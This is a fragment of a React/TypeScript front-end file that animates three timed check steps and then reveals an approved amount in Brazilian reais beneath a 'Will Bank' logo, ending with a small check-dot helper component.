    const timer3 = setTimeout(() => setStep3(true), 1500);
    const timer4 = setTimeout(() => setShowValue(true), 2000);
    
    return () => {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timer4);
    };
  }, []);

  return (
    <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-5 shadow-lg">
      <div className="flex justify-center">
        <img src={willbankLogo} alt="Will Bank" className="h-10" />
      </div>
      
      <div className="flex items-center justify-center gap-3">
        <AnimatedCheckDot completed={step1} />
        <div className={`w-8 h-0.5 transition-all duration-500 ${step1 && step2 ? 'bg-primary' : 'bg-muted'}`} />
        <AnimatedCheckDot completed={step2} />
        <div className={`w-8 h-0.5 transition-all duration-500 ${step2 && step3 ? 'bg-primary' : 'bg-muted'}`} />
        <AnimatedCheckDot completed={step3} />
      </div>

      <div className="text-center space-y-2">
        <p className={`text-sm text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
          Valor aprovado
        </p>
        <p className={`text-3xl font-black text-green-600 transition-all duration-700 ${showValue ? 'opacity-100 scale-100' : 'opacity-0 scale-75'}`}>
          R$ {value.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
        </p>
      </div>
    </div>
  );
};

const AnimatedCheckDot = ({ completed }: { completed: boolean }) => (
  <div className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
    {completed && (
      <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />
    )}
  </div>
);

export default Chat;
